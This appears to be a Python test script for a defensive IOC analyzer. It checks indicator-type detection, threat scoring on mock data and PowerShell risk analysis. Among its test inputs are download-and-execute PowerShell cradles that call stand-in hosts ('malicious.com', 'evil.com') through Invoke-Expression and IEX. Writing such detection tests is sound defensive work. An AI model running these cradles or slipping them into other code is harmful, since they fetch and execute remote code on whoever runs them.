#!/usr/bin/env python3
"""
Test script for IOC Analyzer
Tests various IOC types without needing the full web app
"""

from ioc_analyzer import IOCAnalyzer

def test_ioc_detection():
    """Test IOC type detection"""
    print("=" * 60)
    print("Testing IOC Type Detection")
    print("=" * 60)
    
    analyzer = IOCAnalyzer({})
    
    test_cases = [
        ("8.8.8.8", "ip"),
        ("192.168.1.1", "ip"),
        ("2001:0db8::1", "ip"),
        ("google.com", "domain"),
        ("example.com", "domain"),
        ("https://www.example.com", "url"),
        ("http://test.com/path", "url"),
        ("5d41402abc4b2a76b9719d911017c592", "md5"),
        ("aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d", "sha1"),
        ("2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae", "sha256"),
        ("test@example.com", "email"),
        ("admin@test.com", "email"),
        ("Invoke-WebRequest -Uri http://malicious.com", "powershell"),
        ("powershell -enc SGVsbG8=", "powershell"),
        (".exe", "extension"),
        (".dll", "extension"),
    ]
    
    passed = 0
    failed = 0
    
    for ioc, expected_type in test_cases:
        detected_type = analyzer.identify_ioc_type(ioc)
        status = "✓" if detected_type == expected_type else "✗"
        
        if detected_type == expected_type:
            passed += 1
        else:
            failed += 1
        
        print(f"{status} {ioc[:50]:50s} → {detected_type:12s} (expected: {expected_type})")
    
    print("\n" + "=" * 60)
    print(f"Results: {passed} passed, {failed} failed")
    print("=" * 60)

def test_threat_scoring():
    """Test threat score calculation"""
    print("\n" + "=" * 60)
    print("Testing Threat Score Calculation")
    print("=" * 60)
    
    analyzer = IOCAnalyzer({})
    
    # Test with mock data
    test_results = {
        'ioc': 'test.com',
        'type': 'domain',
        'details': {
            'virustotal': {'malicious': 10, 'suspicious': 5, 'harmless': 50},
            'abuseipdb': {'abuse_confidence_score': 75}
        }
    }
    
    result = analyzer.calculate_threat_metrics(test_results)
    
    print(f"IOC: {result['ioc']}")
    print(f"Type: {result['type']}")
    print(f"Threat Score: {result['threat_score']}/100")
    print(f"Severity: {result['severity']}")
    print(f"Category: {result['threat_category']}")
    print(f"Threat Type: {result['threat_type']}")
    
    print("\n" + "=" * 60)

def test_powershell_analysis():
    """Test PowerShell command analysis"""
    print("\n" + "=" * 60)
    print("Testing PowerShell Command Analysis")
    print("=" * 60)
    
    analyzer = IOCAnalyzer({})
    
    test_commands = [
        "Invoke-WebRequest -Uri http://malicious.com/payload.ps1 | Invoke-Expression",
        "powershell -enc SGVsbG8gV29ybGQ=",
        "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')",
        "Get-Process",  # Benign command
    ]
    
    for cmd in test_commands:
        result = analyzer.analyze_powershell(cmd)
        ps_analysis = result.get('powershell_analysis', {})
        
        print(f"\nCommand: {cmd[:60]}")
        print(f"  Risk Level: {ps_analysis.get('risk_level', 'Unknown')}")
        print(f"  Suspicious Patterns: {len(ps_analysis.get('suspicious_patterns', []))}")
        print(f"  Contains Base64: {ps_analysis.get('contains_base64', False)}")
        if ps_analysis.get('suspicious_patterns'):
            print(f"  Patterns Found: {', '.join(ps_analysis['suspicious_patterns'][:3])}")
    
    print("\n" + "=" * 60)

def main():
    """Run all tests"""
    print("\n🧪 IOC Analyzer Test Suite\n")
    
    try:
        test_ioc_detection()
        test_threat_scoring()
        test_powershell_analysis()
        
        print("\n✅ All tests completed successfully!\n")
        
    except Exception as e:
        print(f"\n❌ Test failed with error: {e}\n")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
